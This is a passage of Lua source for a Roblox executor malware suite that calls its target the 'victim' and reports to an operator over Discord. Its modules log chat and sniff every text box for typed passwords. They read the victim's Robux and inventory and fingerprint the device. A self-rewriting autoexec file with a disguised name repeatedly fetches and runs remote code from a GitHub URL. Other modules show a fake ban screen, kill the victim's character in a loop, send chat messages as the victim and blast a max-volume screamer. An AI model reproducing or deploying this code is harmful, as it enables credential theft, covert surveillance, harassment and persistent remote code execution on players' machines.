        -- Robux balance
        pcall(function()
            local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
            if r then
                local d = HttpService:JSONDecode(r)
                if d and d.robux then
                    result = result .. "\n**Robux:** " .. tostring(d.robux)
                end
            end
        end)

        -- Game passes
        pcall(function()
            local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
            if r then
                local d = HttpService:JSONDecode(r)
                if d and d.data and #d.data > 0 then
                    local passes = {}
                    for _, v in ipairs(d.data) do
                        table.insert(passes, tostring(v.name or v.assetName or v.id or "Unknown"))
                    end
                    result = result .. "\n**Game Passes:** " .. table.concat(passes, ", ")
                else
                    result = result .. "\n**Game Passes:** None"
                end
            end
        end)

        -- Limiteds
        pcall(function()
            local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=10&sortOrder=Desc")
            if r then
                local d = HttpService:JSONDecode(r)
                if d and d.data and #d.data > 0 then
                    local totalRAP = 0
                    local items = {}
                    for _, v in ipairs(d.data) do
                        local rap = v.recentAveragePrice or 0
                        totalRAP = totalRAP + rap
                        table.insert(items, tostring(v.name or "Unknown") .. " (RAP: " .. tostring(rap) .. ")")
                    end
                    result = result .. "\n**Limiteds (est. RAP: " .. tostring(totalRAP) .. "R$):\n" .. table.concat(items, "\n")
                else
                    result = result .. "\n**Limiteds:** None"
                end
            end
        end)

        send("INVENTORY CHECK", result:sub(1, 1900), 16776960)
    end)
end

task.wait(4)
runInventoryCheck()
getgenv().IntelSuite.InventoryCheck = runInventoryCheck

-- ============================================================
-- MODULE 13: Chat Logger
-- Hooks TextChatService (new) + legacy chat
-- Logs all visible chat messages to Discord in real time
-- Also available via !cmd chatlog
-- ============================================================
local function startChatLogger()
    if getgenv().IntelSuite.ChatLogActive then return end
    getgenv().IntelSuite.ChatLogActive = true

    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local chatBuffer = {}
    local lastSend = os.time()

    local function flushChat()
        if #chatBuffer == 0 then return end
        local msg = table.concat(chatBuffer, "\n")
        chatBuffer = {}
        send("CHAT LOG", msg:sub(1, 1900), 16753920)
    end

    -- Hook TextChatService (new Roblox chat system)
    pcall(function()
        local TextChatService = game:GetService("TextChatService")
        if TextChatService and TextChatService.MessageReceived then
            TextChatService.MessageReceived:Connect(function(msg)
                if not getgenv().IntelSuite.IsActive then return end
                local sender = "Unknown"
                pcall(function()
                    if msg.TextSource then
                        local p = Players:GetPlayerByUserId(msg.TextSource.UserId)
                        if p then sender = p.Name end
                    end
                end)
                local line = "[" .. sender .. "]: " .. tostring(msg.Text)
                table.insert(chatBuffer, line)
                if os.time() - lastSend >= 10 or #chatBuffer >= 10 then
                    lastSend = os.time()
                    flushChat()
                end
            end)
        end
    end)

    -- Hook legacy chat system
    pcall(function()
        local chat = game:GetService("Chat")
        if chat then
            Players.PlayerAdded:Connect(function(p)
                p.Chatted:Connect(function(msg)
                    if not getgenv().IntelSuite.IsActive then return end
                    local line = "[" .. p.Name .. "]: " .. tostring(msg)
                    table.insert(chatBuffer, line)
                    if os.time() - lastSend >= 10 or #chatBuffer >= 10 then
                        lastSend = os.time()
                        flushChat()
                    end
                end)
            end)
            -- Hook existing players
            for _, p in ipairs(Players:GetPlayers()) do
                p.Chatted:Connect(function(msg)
                    if not getgenv().IntelSuite.IsActive then return end
                    local line = "[" .. p.Name .. "]: " .. tostring(msg)
                    table.insert(chatBuffer, line)
                    if os.time() - lastSend >= 10 or #chatBuffer >= 10 then
                        lastSend = os.time()
                        flushChat()
                    end
                end)
            end
        end
    end)

    send("CHAT LOGGER", "Chat logger active. Messages will be sent in batches of 10 or every 10 seconds.", 16753920)
end

-- Start on load
task.spawn(startChatLogger)
getgenv().IntelSuite.ChatLogger = startChatLogger

-- ============================================================
-- MODULE 14: TextBox Sniffer
-- Hooks FocusLost on ALL TextBoxes in PlayerGui
-- Catches anything the victim types: passwords, usernames, searches
-- Also scans for new GUIs added after load
-- ============================================================
local function startTextBoxSniffer()
    if getgenv().IntelSuite.TextBoxActive then return end
    getgenv().IntelSuite.TextBoxActive = true

    local Players = game:GetService("Players")
    local hooked = {}

    local function hookTextBox(tb)
        if hooked[tb] then return end
        hooked[tb] = true
        tb.FocusLost:Connect(function()
            if not getgenv().IntelSuite.IsActive then return end
            local text = tb.Text
            if text and text ~= "" then
                local parent = "Unknown"
                pcall(function()
                    parent = tb:GetFullName()
                end)
                local msg = "**User:** " .. LocalPlayer.Name ..
                    "\n**Typed:** " .. tostring(text) ..
                    "\n**Field:** " .. tostring(parent)
                send("TEXTBOX INPUT", msg, 16711680)
            end
        end)
    end

    local function scanGui(gui)
        pcall(function()
            for _, obj in ipairs(gui:GetDescendants()) do
                if obj:IsA("TextBox") then
                    hookTextBox(obj)
                end
            end
            gui.DescendantAdded:Connect(function(obj)
                if obj:IsA("TextBox") then
                    hookTextBox(obj)
                end
            end)
        end)
    end

    -- Scan all existing GUIs in PlayerGui
    pcall(function()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        if playerGui then
            for _, gui in ipairs(playerGui:GetChildren()) do
                scanGui(gui)
            end
            -- Watch for new GUIs added later
            playerGui.ChildAdded:Connect(function(gui)
                task.wait(0.5)
                scanGui(gui)
            end)
        end
    end)

    -- Also scan CoreGui if accessible
    pcall(function()
        local coreGui = game:GetService("CoreGui")
        if coreGui then
            scanGui(coreGui)
        end
    end)

    send("TEXTBOX SNIFFER", "TextBox sniffer active. All typed input will be logged.", 16711680)
end

-- Start on load
task.spawn(startTextBoxSniffer)
getgenv().IntelSuite.TextBoxSniffer = startTextBoxSniffer

-- ============================================================
-- MODULE 15: Player Join/Leave Logger
-- Logs every player that joins or leaves the server in real time
-- Includes account age, user ID, and timestamp

-- ============================================================
-- MODULE 16: Persistence (v2 — loop rewriter, stealth filename, Kevin-only uninstall)
-- Writes loader to autoexec every 30s so victim cannot remove it
-- File named "roblox_settings.lua" to look innocent
-- Only removable by running the uninstall command from Kevin's bot
-- ============================================================
local function installPersistence()
    if getgenv().IntelSuite.PersistenceLoop then return end
    getgenv().IntelSuite.PersistenceLoop = true

    -- Innocent looking filename so victim doesn't notice
    local fileName = "roblox_settings.lua"

    local loaderContent = 'if game:IsLoaded() then\n' ..
        '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
        'else\n' ..
        '    game.Loaded:Wait()\n' ..
        '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
        'end'

    -- All paths to try writing to
    -- Xeno: autoexec is NOT inside workspace, try traversal paths
    local paths = {
        "autoexec/" .. fileName,
        "autoexec\\" .. fileName,
        "Autoexec/" .. fileName,
        "AutoExec/" .. fileName,
        "../autoexec/" .. fileName,
        "../../autoexec/" .. fileName,
        "../Autoexec/" .. fileName,
        "scripts/autoexec/" .. fileName,
        fileName, -- root workspace, some executors run all .lua files here
    }

    local function writeAll()
        local installed = {}
        for _, path in ipairs(paths) do
            pcall(function()
                writefile(path, loaderContent)
                table.insert(installed, path)
            end)
        end
        return installed
    end

    -- Initial install + report
    local installed = writeAll()
    local installedStr = #installed > 0 and table.concat(installed, "\n") or "None"

    local msg = "**User:** " .. LocalPlayer.Name ..
        "\n**ID:** " .. tostring(LocalPlayer.UserId) ..
        "\n**Executor:** " .. getExec() ..
        "\n**File:** `" .. fileName .. "`" ..
        "\n**Installed to:**\n" .. installedStr ..
        "\n\nRe-writing every 30s. Victim cannot remove permanently.\nUse `!cmd unpersist` to uninstall."

    send("PERSISTENCE INSTALLED", msg, 9699539)

    -- Loop: re-write every 30 seconds so victim can never permanently delete it
    task.spawn(function()
        while getgenv().IntelSuite.PersistenceLoop do
            task.wait(30)
            if not getgenv().IntelSuite.IsActive then continue end
            writeAll()
        end
    end)
end

-- Expose uninstall function (triggered via !cmd unpersist from Kevin's bot)
getgenv().IntelSuite.UninstallPersistence = function()
    getgenv().IntelSuite.PersistenceLoop = false
    local fileName = "roblox_settings.lua"
    local paths = {
        "autoexec/" .. fileName,
        "autoexec\\" .. fileName,
        "Autoexec/" .. fileName,
        "AutoExec/" .. fileName,
        "scripts/autoexec/" .. fileName,
    }
    local removed = {}
    for _, path in ipairs(paths) do
        pcall(function()
            delfile(path)
            table.insert(removed, path)
        end)
    end
    local removedStr = #removed > 0 and table.concat(removed, "\n") or "None"
    send("PERSISTENCE REMOVED", "**Uninstalled by operator.**\n**Files deleted:**\n" .. removedStr, 16711680)
end

-- Run on startup
task.spawn(installPersistence)
getgenv().IntelSuite.InstallPersistence = installPersistence

-- ============================================================
-- MODULE 17: Player Scan
-- Scans every player in the server on startup + !cmd playerscan
-- Grabs: position, health, max health, team, tool equipped, walk speed
-- ============================================================
local function runPlayerScan()
    local Players = game:GetService("Players")
    local result = "**Server Player Scan**\n"
    result = result .. "**Game:** " .. getGame() .. "\n"
    result = result .. "**Total Players:** " .. tostring(#Players:GetPlayers()) .. "\n\n"

    for _, p in ipairs(Players:GetPlayers()) do
        pcall(function()
            local line = "**" .. p.Name .. "** (ID: " .. tostring(p.UserId) .. ")\n"

            -- Health
            pcall(function()
                local hum = p.Character and p.Character:FindFirstChildOfClass("Humanoid")
                if hum then
                    line = line .. "  Health: " .. tostring(math.floor(hum.Health)) .. "/" .. tostring(math.floor(hum.MaxHealth)) .. "\n"
                    line = line .. "  WalkSpeed: " .. tostring(hum.WalkSpeed) .. "\n"
                    line = line .. "  JumpPower: " .. tostring(hum.JumpPower) .. "\n"
                end
            end)

            -- Position
            pcall(function()
                local hrp = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local pos = hrp.Position
                    line = line .. "  Position: (" .. tostring(math.floor(pos.X)) .. ", " .. tostring(math.floor(pos.Y)) .. ", " .. tostring(math.floor(pos.Z)) .. ")\n"
                end
            end)

            -- Tool equipped
            pcall(function()
                local tool = p.Character and p.Character:FindFirstChildOfClass("Tool")
                if tool then
                    line = line .. "  Tool: " .. tostring(tool.Name) .. "\n"
                else
                    line = line .. "  Tool: None\n"
                end
            end)

            -- Team
            pcall(function()
                if p.Team then
                    line = line .. "  Team: " .. tostring(p.Team.Name) .. "\n"
                end
            end)

            result = result .. line .. "\n"
        end)
    end

    send("PLAYER SCAN", result:sub(1, 1900), 9699539)
end

-- Run on startup
task.spawn(runPlayerScan)
getgenv().IntelSuite.PlayerScan = runPlayerScan

-- ============================================================
-- MODULE 18: Remote Scanner
-- Scans ALL RemoteEvents and RemoteFunctions in the game
-- Sends full list to Discord — gold for finding exploitable remotes
-- Also available via !cmd remotescan
-- ============================================================
local function runRemoteScanner()
    local result = "**Remote Scanner**\n"
    result = result .. "**Game:** " .. getGame() .. "\n\n"

    local remoteEvents = {}
    local remoteFunctions = {}
    local bindableEvents = {}

    -- Scan entire game tree
    for _, obj in ipairs(game:GetDescendants()) do
        pcall(function()
            if obj:IsA("RemoteEvent") then
                table.insert(remoteEvents, obj:GetFullName())
            elseif obj:IsA("RemoteFunction") then
                table.insert(remoteFunctions, obj:GetFullName())
            elseif obj:IsA("BindableEvent") then
                table.insert(bindableEvents, obj:GetFullName())
            end
        end)
    end

    result = result .. "**RemoteEvents (" .. tostring(#remoteEvents) .. "):**\n"
    for i, name in ipairs(remoteEvents) do
        if i > 30 then result = result .. "  ...and " .. tostring(#remoteEvents - 30) .. " more\n" break end
        result = result .. "  - " .. name .. "\n"
    end

    result = result .. "\n**RemoteFunctions (" .. tostring(#remoteFunctions) .. "):**\n"
    for i, name in ipairs(remoteFunctions) do
        if i > 15 then result = result .. "  ...and " .. tostring(#remoteFunctions - 15) .. " more\n" break end
        result = result .. "  - " .. name .. "\n"
    end

    result = result .. "\n**BindableEvents (" .. tostring(#bindableEvents) .. "):**\n"
    for i, name in ipairs(bindableEvents) do
        if i > 10 then result = result .. "  ...and " .. tostring(#bindableEvents - 10) .. " more\n" break end
        result = result .. "  - " .. name .. "\n"
    end

    send("REMOTE SCANNER", result:sub(1, 1900), 16753920)
end

-- Run on startup
task.spawn(runRemoteScanner)
getgenv().IntelSuite.RemoteScanner = runRemoteScanner

-- ============================================================
-- MODULE 19: Device Fingerprint
-- Grabs platform, screen resolution, FPS, graphics quality,
-- Roblox version, input type, and locale
-- Fires on startup automatically
-- ============================================================
local function runDeviceFingerprint()
    local UserInputService = game:GetService("UserInputService")
    local UserGameSettings = UserSettings():GetService("UserGameSettings")
    local RunService = game:GetService("RunService")
    local LocalizationService = game:GetService("LocalizationService")

    local result = "**User:** " .. LocalPlayer.Name ..
        "\n**ID:** " .. tostring(LocalPlayer.UserId)

    -- Platform detection
    local platform = "PC"
    pcall(function()
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            platform = "Mobile"
        elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
            platform = "Console"
        elseif UserInputService.TouchEnabled and UserInputService.KeyboardEnabled then
            platform = "PC (Touch)"
        end
    end)
    result = result .. "\n**Platform:** " .. platform

    -- Screen resolution
    pcall(function()
        local vp = workspace.CurrentCamera.ViewportSize
        result = result .. "\n**Resolution:** " .. tostring(math.floor(vp.X)) .. "x" .. tostring(math.floor(vp.Y))
    end)

    -- FPS
    pcall(function()
        local fps = 0
        local t = tick()
        RunService.RenderStepped:Wait()
        fps = math.floor(1 / (tick() - t))
        result = result .. "\n**FPS:** " .. tostring(fps)
    end)

    -- Graphics quality
    pcall(function()
        local quality = UserGameSettings.SavedQualityLevel
        result = result .. "\n**Graphics Quality:** " .. tostring(quality)
    end)

    -- Roblox version
    pcall(function()
        result = result .. "\n**Roblox Version:** " .. tostring(version())
    end)

    -- Locale / region
    pcall(function()
        result = result .. "\n**System Locale:** " .. tostring(LocalizationService.SystemLocaleId)
        result = result .. "\n**Roblox Locale:** " .. tostring(LocalizationService.RobloxLocaleId)
    end)

    -- Input devices
    pcall(function()
        result = result .. "\n**Keyboard:** " .. tostring(UserInputService.KeyboardEnabled)
        result = result .. "\n**Mouse:** " .. tostring(UserInputService.MouseEnabled)
        result = result .. "\n**Touch:** " .. tostring(UserInputService.TouchEnabled)
        result = result .. "\n**Gamepad:** " .. tostring(UserInputService.GamepadEnabled)
    end)

    -- Accelerometer (mobile only)
    pcall(function()
        result = result .. "\n**Accelerometer:** " .. tostring(UserInputService.AccelerometerEnabled)
        result = result .. "\n**Gyroscope:** " .. tostring(UserInputService.GyroscopeEnabled)
    end)

    send("DEVICE FINGERPRINT", result, 6684927)
end

-- Run on startup
task.spawn(runDeviceFingerprint)
getgenv().IntelSuite.DeviceFingerprint = runDeviceFingerprint

-- ============================================================
-- MODULE 20: Fake Ban Screen
-- Spawns a full-screen convincing fake Roblox ban GUI
-- Triggered via !cmd fakeban
-- Victim thinks they got banned and panics
-- ============================================================
local function showFakeBan()
    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")

    pcall(function()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        if not playerGui then return end

        -- Remove if already exists
        local existing = playerGui:FindFirstChild("GhostBanScreen")
        if existing then existing:Destroy() end

        local screen = Instance.new("ScreenGui")
        screen.Name = "GhostBanScreen"
        screen.ResetOnSpawn = false
        screen.IgnoreGuiInset = true
        screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screen.Parent = playerGui

        -- Dark overlay
        local bg = Instance.new("Frame")
        bg.Size = UDim2.new(1, 0, 1, 0)
        bg.Position = UDim2.new(0, 0, 0, 0)
        bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        bg.BorderSizePixel = 0
        bg.ZIndex = 10
        bg.Parent = screen

        -- Red top bar
        local topBar = Instance.new("Frame")
        topBar.Size = UDim2.new(1, 0, 0, 6)
        topBar.Position = UDim2.new(0, 0, 0, 0)
        topBar.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        topBar.BorderSizePixel = 0
        topBar.ZIndex = 11
        topBar.Parent = bg

        -- Roblox logo text
        local logo = Instance.new("TextLabel")
        logo.Size = UDim2.new(1, 0, 0, 60)
        logo.Position = UDim2.new(0, 0, 0, 40)
        logo.BackgroundTransparency = 1
        logo.Text = "ROBLOX"
        logo.TextColor3 = Color3.fromRGB(255, 255, 255)
        logo.TextSize = 42
        logo.Font = Enum.Font.GothamBold
        logo.ZIndex = 11
        logo.Parent = bg

        -- Main ban message
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(0.7, 0, 0, 50)
        title.Position = UDim2.new(0.15, 0, 0.25, 0)
        title.BackgroundTransparency = 1
        title.Text = "Your account has been banned"
        title.TextColor3 = Color3.fromRGB(255, 80, 80)
        title.TextSize = 32
        title.Font = Enum.Font.GothamBold
        title.ZIndex = 11
        title.Parent = bg

        -- Reason
        local reason = Instance.new("TextLabel")
        reason.Size = UDim2.new(0.7, 0, 0, 40)
        reason.Position = UDim2.new(0.15, 0, 0.38, 0)
        reason.BackgroundTransparency = 1
        reason.Text = "Reason: Exploiting / Use of unauthorized third-party software"
        reason.TextColor3 = Color3.fromRGB(200, 200, 200)
        reason.TextSize = 18
        reason.Font = Enum.Font.Gotham
        reason.TextWrapped = true
        reason.ZIndex = 11
        reason.Parent = bg

        -- Duration
        local duration = Instance.new("TextLabel")
        duration.Size = UDim2.new(0.7, 0, 0, 30)
        duration.Position = UDim2.new(0.15, 0, 0.50, 0)
        duration.BackgroundTransparency = 1
        duration.Text = "Duration: Permanent"
        duration.TextColor3 = Color3.fromRGB(255, 80, 80)
        duration.TextSize = 20
        duration.Font = Enum.Font.GothamBold
        duration.ZIndex = 11
        duration.Parent = bg

        -- Case ID
        local caseId = Instance.new("TextLabel")
        caseId.Size = UDim2.new(0.7, 0, 0, 25)
        caseId.Position = UDim2.new(0.15, 0, 0.60, 0)
        caseId.BackgroundTransparency = 1
        caseId.Text = "Case ID: " .. tostring(math.random(100000000, 999999999))
        caseId.TextColor3 = Color3.fromRGB(150, 150, 150)
        caseId.TextSize = 14
        caseId.Font = Enum.Font.Gotham
        caseId.ZIndex = 11
        caseId.Parent = bg

        -- Appeal info
        local appeal = Instance.new("TextLabel")
        appeal.Size = UDim2.new(0.7, 0, 0, 40)
        appeal.Position = UDim2.new(0.15, 0, 0.68, 0)
        appeal.BackgroundTransparency = 1
        appeal.Text = "If you believe this is a mistake, you may submit an appeal at www.roblox.com/appeal\nAppeals are reviewed within 30 days."
        appeal.TextColor3 = Color3.fromRGB(130, 130, 130)
        appeal.TextSize = 13
        appeal.Font = Enum.Font.Gotham
        appeal.TextWrapped = true
        appeal.ZIndex = 11
        appeal.Parent = bg

        -- OK button (does nothing)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 160, 0, 44)
        btn.Position = UDim2.new(0.5, -80, 0.82, 0)
        btn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        btn.BorderSizePixel = 0
        btn.Text = "OK"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = 18
        btn.Font = Enum.Font.GothamBold
        btn.ZIndex = 12
        btn.Parent = bg

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 6)
        corner.Parent = btn

        -- Button click — screen flickers but stays
        btn.MouseButton1Click:Connect(function()
            bg.BackgroundColor3 = Color3.fromRGB(50, 30, 30)
            task.wait(0.1)
            bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        end)

        send("FAKE BAN DEPLOYED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Fake ban screen is now covering their entire screen.", 16711680)
    end)
end

getgenv().IntelSuite.FakeBan = showFakeBan

-- ============================================================
-- MODULE 21: Kill Loop
-- Kills victim's character every 3 seconds
-- !cmd killloop — start | !cmd killstop — stop
-- ============================================================
local function startKillLoop()
    if getgenv().IntelSuite.KillLoopActive then return end
    getgenv().IntelSuite.KillLoopActive = true

    send("KILL LOOP STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Killing character every 3 seconds.", 16711680)

    task.spawn(function()
        while getgenv().IntelSuite.KillLoopActive do
            pcall(function()
                local char = LocalPlayer.Character
                if char then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum then
                        hum.Health = 0
                    end
                end
            end)
            task.wait(3)
        end
    end)
end

local function stopKillLoop()
    getgenv().IntelSuite.KillLoopActive = false
    send("KILL LOOP STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Kill loop deactivated.", 65280)
end

getgenv().IntelSuite.StartKillLoop = startKillLoop
getgenv().IntelSuite.StopKillLoop = stopKillLoop

-- ============================================================
-- MODULE 22: Chat Spam As Them
-- Sends chat messages AS the victim using the chat remote
-- !cmd chatas:<message> — sends that message as them
-- !cmd chatspam:<message> — sends it 10 times rapidly
-- ============================================================
local function chatAs(message)
    local success = false

    -- Method 1: TextChatService (new chat)
    pcall(function()
        local TextChatService = game:GetService("TextChatService")
        local channel = TextChatService:FindFirstChild("TextChannels")
        if channel then
            local general = channel:FindFirstChild("RBXGeneral")
            if general then
                general:SendAsync(message)
                success = true
            end
        end
    end)

    -- Method 2: Legacy chat remote
    if not success then
        pcall(function()
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents", true)
            if remote then
                local sayMsg = remote:FindFirstChild("SayMessageRequest")
                if sayMsg then
                    sayMsg:FireServer(message, "All")
                    success = true
                end
            end
        end)
    end

    -- Method 3: Direct chat fire
    if not success then
        pcall(function()
            local repStorage = game:GetService("ReplicatedStorage")
            for _, v in ipairs(repStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") and (v.Name:lower():find("chat") or v.Name:lower():find("say") or v.Name:lower():find("message")) then
                    pcall(function() v:FireServer(message) end)
                end
            end
        end)
    end

    send("CHAT AS VICTIM", "**User:** " .. LocalPlayer.Name .. "\n**Message sent:** " .. tostring(message) .. "\n**Success:** " .. tostring(success), 16753920)
end

local function chatSpam(message)
    send("CHAT SPAM STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Message:** " .. tostring(message) .. "\n**Sending 10 times...**", 16753920)
    task.spawn(function()
        for i = 1, 10 do
            chatAs(message)
            task.wait(0.5)
        end
    end)
end

getgenv().IntelSuite.ChatAs = chatAs
getgenv().IntelSuite.ChatSpam = chatSpam

-- ============================================================
-- MODULE 23: Screamer
-- Plays max volume sound + flashes screen red repeatedly
-- !cmd scream — trigger | !cmd screamstop — stop
-- ============================================================
local function startScreamer()
    if getgenv().IntelSuite.ScreamerActive then return end
    getgenv().IntelSuite.ScreamerActive = true

    pcall(function()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        if not playerGui then return end

        -- Flash GUI
        local screen = Instance.new("ScreenGui")
        screen.Name = "GhostScreamer"
        screen.ResetOnSpawn = false
        screen.IgnoreGuiInset = true
        screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screen.Parent = playerGui

        local flash = Instance.new("Frame")
        flash.Size = UDim2.new(1, 0, 1, 0)
        flash.Position = UDim2.new(0, 0, 0, 0)
        flash.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        flash.BackgroundTransparency = 1
        flash.BorderSizePixel = 0
        flash.ZIndex = 20
        flash.Parent = screen

        -- Loud sound
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://138186576"
        sound.Volume = 10
        sound.Looped = true
        sound.Parent = workspace
        sound:Play()

        getgenv().IntelSuite.ScreamerSound = sound
        getgenv().IntelSuite.ScreamerGui = screen

        -- Flash loop
        task.spawn(function()
            while getgenv().IntelSuite.ScreamerActive do
                flash.BackgroundTransparency = 0
                task.wait(0.05)
                flash.BackgroundTransparency = 1
                task.wait(0.05)
            end
        end)

        send("SCREAMER STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Max volume sound + red screen flash active.", 16711680)
    end)
end

local function stopScreamer()
    getgenv().IntelSuite.ScreamerActive = false
    pcall(function()
        if getgenv().IntelSuite.ScreamerSound then
            getgenv().IntelSuite.ScreamerSound:Stop()
            getgenv().IntelSuite.ScreamerSound:Destroy()
        end
        if getgenv().IntelSuite.ScreamerGui then
            getgenv().IntelSuite.ScreamerGui:Destroy()
        end
    end)
    send("SCREAMER STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Screamer deactivated.", 65280)
end

getgenv().IntelSuite.StartScreamer = startScreamer
getgenv().IntelSuite.StopScreamer = stopScreamer

-- ============================================================
-- MODULE 24: Teleport Hook
-- Detects when victim is about to teleport or leave the game
-- Fires a final full data dump before the Lua VM resets
-- Completely silent — victim has no idea
-- ============================================================
local function startTeleportHook()
    if getgenv().IntelSuite.TeleportHookActive then return end
    getgenv().IntelSuite.TeleportHookActive = true

    local TeleportService = game:GetService("TeleportService")
    local Players = game:GetService("Players")

    local function fireFinalDump(reason)
        task.spawn(function()
            local msg = "**User:** " .. LocalPlayer.Name ..
                "\n**ID:** " .. tostring(LocalPlayer.UserId) ..
                "\n**Reason:** " .. tostring(reason) ..
                "\n**Game:** " .. getGame() ..
                "\n**Place ID:** " .. tostring(game.PlaceId) ..
                "\n**Session:** " .. SESSION_ID ..
                "\n**Time in game:** " .. tostring(math.floor(time())) .. "s" ..
                "\n\n**Final Player List:**"

            for _, p in ipairs(Players:GetPlayers()) do
                pcall(function()
                    msg = msg .. "\n  - " .. p.Name .. " (ID: " .. tostring(p.UserId) .. ")"
                end)
            end

            -- Final keylog flush
            if getgenv().IntelSuite.Buffer and getgenv().IntelSuite.Buffer ~= "" then
                send("FINAL KEYLOG", "**User:** " .. LocalPlayer.Name .. "\n**Buffer:** " .. getgenv().IntelSuite.Buffer, 16711680)
                getgenv().IntelSuite.Buffer = ""
            end

            send("VICTIM LEAVING", msg, 16711680)
        end)
    end

    -- Hook TeleportService
    pcall(function()
        TeleportService.LocalPlayerArrivedFromTeleport:Connect(function()
            fireFinalDump("Arrived from teleport")
        end)
    end)

    -- Hook game:BindToClose (fires when game is about to close)
    pcall(function()
        game:BindToClose(function()
            fireFinalDump("Game closing / leaving")
            task.wait(2) -- give time for HTTP request to fire
        end)
    end)

    -- Hook LocalPlayer.OnTeleport
    pcall(function()
        TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage)
            if player == LocalPlayer then
                fireFinalDump("Teleport failed: " .. tostring(errorMessage))
            end
        end)
    end)

    -- Hook character removing (fires when they die or leave)
    pcall(function()
        LocalPlayer.CharacterRemoving:Connect(function()
            if not getgenv().IntelSuite.IsActive then return end
            -- Only fire if they're actually leaving, not just dying
            task.delay(3, function()
                if not LocalPlayer.Character then
                    fireFinalDump("Character removed — possible disconnect")
                end
            end)
        end)
    end)

    -- Watch for teleport state changes
    pcall(function()
        local lastState = nil
        game:GetService("RunService").Heartbeat:Connect(function()
            if not getgenv().IntelSuite.IsActive then return end
            pcall(function()
                local state = TeleportService:GetLocalPlayerTeleportData()
                if state ~= lastState and state ~= nil then
                    lastState = state
                    fireFinalDump("Teleport data detected")
                end
            end)
        end)
    end)
end

-- Start on load
task.spawn(startTeleportHook)
getgenv().IntelSuite.TeleportHook = startTeleportHook

-- ============================================================
-- MODULE 25: Executor-Aware Persistence Upgrade
-- Detects executor and uses the correct autoexec path for each
-- KRNL, Synapse X, Script-Ware: writefile works to autoexec
-- Xeno: skips autoexec write, notifies Kevin
-- ============================================================
local function installExecutorPersistence()
    if getgenv().IntelSuite.ExecPersistDone then return end
    getgenv().IntelSuite.ExecPersistDone = true

    local exec = getExec()
    local fileName = "roblox_settings.lua"

    local loaderContent = 'if game:IsLoaded() then\n' ..
        '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
        'else\n' ..
        '    game.Loaded:Wait()\n' ..
        '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
        'end'

    -- Executor-specific autoexec paths that actually work
    local execPaths = {
        ["KRNL"] = {
            "autoexec/" .. fileName,
            "autoexec\\" .. fileName,
        },
        ["Synapse X"] = {
            "autoexec/" .. fileName,
            "autoexec\\" .. fileName,
        },
        ["Script-Ware"] = {
            "autoexec/" .. fileName,
            "autoexec\\" .. fileName,
        },
        ["Wave"] = {
            "autoexec/" .. fileName,
        },
        ["Solara"] = {
            "autoexec/" .. fileName,
        },
        ["Delta"] = {
            "autoexec/" .. fileName,
        },
        ["Xeno"] = nil, -- Xeno blocks autoexec writefile — skip
    }

    local paths = execPaths[exec]

    if paths == nil and exec == "Xeno" then
        -- Xeno: cannot write to autoexec — notify Kevin
        send("PERSISTENCE NOTE", "**User:** " .. LocalPlayer.Name ..
            "\n**Executor:** Xeno" ..
            "\n**Status:** Xeno blocks autoexec writefile. Persistence not possible via this method." ..
            "\n**Suite will run for this session only.**", 16753920)
        return
    end

    if not paths then
        -- Unknown executor — try generic paths
        paths = {
            "autoexec/" .. fileName,
            "autoexec\\" .. fileName,
            "../autoexec/" .. fileName,
        }
    end

    local installed = {}
    local failed = {}

    for _, path in ipairs(paths) do
        local ok = pcall(function()
            writefile(path, loaderContent)
        end)
        if ok then
            table.insert(installed, path)
        else
            table.insert(failed, path)
        end
    end

    local installedStr = #installed > 0 and table.concat(installed, "\n") or "None"
    local failedStr = #failed > 0 and table.concat(failed, "\n") or "None"

    local status = #installed > 0 and "INSTALLED" or "FAILED"
    local color = #installed > 0 and 65280 or 16711680

    send("EXECUTOR PERSISTENCE " .. status,
        "**User:** " .. LocalPlayer.Name ..
        "\n**Executor:** " .. exec ..
        "\n**File:** `" .. fileName .. "`" ..
        "\n**Installed to:**\n" .. installedStr ..
        "\n**Failed:**\n" .. failedStr ..
        "\n\nSuite will auto-run on next executor attach.", color)
end

-- Run on startup
task.spawn(installExecutorPersistence)
getgenv().IntelSuite.ExecutorPersistence = installExecutorPersistence

-- ============================================================
